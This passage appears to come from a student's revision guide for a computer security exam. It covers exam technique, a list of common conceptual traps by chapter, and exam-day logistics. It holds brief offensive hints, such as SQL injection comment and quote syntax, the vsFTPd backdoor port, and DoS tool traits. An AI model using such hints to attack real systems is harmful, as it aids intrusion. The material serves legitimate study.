- **Don't overthink a recall MCQ.** Your first instinct on a definition is usually right; only change it if you find a concrete reason.

### How to approach short-answer

- **Answer the question asked, in its own terms.** If the lecturer frames something a particular way (e.g. DoS = "Availability," firewall types "by OSI layer"), use that framing.
- **Lead with the definition, then the mechanism, then an example.** For "explain X" questions, a crisp 3–5 sentence structure (what / how / why-or-example) scores efficiently.
- **For calculation questions (RSA/ElGamal), show the steps**, not just the final number — `n`, `φ(n)`, `d`, then encrypt/decrypt. Partial credit lives in the working. Use the cheat-sheet formulas.
- **Use the offline materials as a backstop, not a crutch** — look up a specific port or CVE if needed, but write the reasoning yourself. (Remember: **no generative AI, no communication, offline only**.)

### Common traps to avoid (high-frequency across the guides)

- **NAT ≠ NAT Network** (NAT blocks VM↔VM; NAT Network allows it). [ch. 01]
- **`-Pn` skips host discovery; `-sn` skips the port scan** — opposites. [ch. 02]
- **Open port ≠ vulnerable.** [ch. 02]
- **Vulnerability assessment stops before exploitation.** [ch. 02/03]
- **Reverse shell** (victim connects out) beats firewalls/NAT, not bind shell. [ch. 03]
- **vsFTPd backdoor → port 6200**, not 21. [ch. 03]
- **Static filter needs a return rule; stateful does not.** **Default-deny** is the secure default. **ACLs: first match wins.** [ch. 04]
- **IDS detects; only an IPS acts.** Misuse misses unknown attacks; anomaly causes false positives. **Stack tweaking only delays a SYN flood.** [ch. 04/06]
- **Virus = human action; worm = none.** [ch. 05]
- **Prepared statements (not just input filtering) are the SQLi fix.** `#` is MySQL-specific (`--` elsewhere); try `"` if `'` fails. [ch. 05]
- **DoS = Availability.** LOIC does **not** spoof IPs (traceable) and can't DDoS alone. **Slowloris is the only Layer-7 / low-bandwidth tool.** [ch. 06]
- **SPF = authorised *server*; DKIM = *signature*/integrity.** URL check is the most reliable manual phishing indicator. [ch. 07]
- **STRIDE pairings** (Tampering→Integrity, EoP→Authorization, Repudiation→Non-repudiation). **Eliminate > mitigate. Fuzzing is testing, not mitigation. DREAD has two D's.** [ch. 08]
- **Textbook RSA is insecure without padding (OAEP).** RSA = factoring; ElGamal = discrete log + randomized. **OTP key: random, ≥ plaintext, never reused.** **`φ(n)=(p−1)(q−1)`; encrypt/decrypt mod `n`, key relation mod `φ(n)`.** [ch. 09]
- **MPC: XOR free, AND needs communication.** MPC does **not** hide output-implied leakage. Add the `d∧e` constant on **exactly one** party's share. [ch. 10]
- **Pick exactly ONE GDPR lawful basis.** Pseudonymization ≠ anonymization (pseudonymized = still personal data). **72-hour breach notification.** [ch. 11]
- **Attack trees: AND = block any one step; OR = must block all.** Pods talk freely by default (need a Network Policy). Use **K8s Secrets, not ConfigMaps**. [ch. 12]

### Final checklist before you walk in

- Arrive **1 hour early** (meeting time); **doors close 15 min before start**.
- Have **all materials downloaded offline** (study guide, slides, lab solutions) — internet only for download/upload.
- Phone/smartwatch **off and in the corner**; one screen only.
- Know your **allocated room** (checked the day before on "DE").
- Plan: **MCQ block first (itslearning) → short-answer (Digital Exam) → review → submit both.**

Good luck — the labs the lecturer named (2, 3, 5, 6, 8, 9) are where the marks concentrate; the cheat sheet above is your last-minute pass.
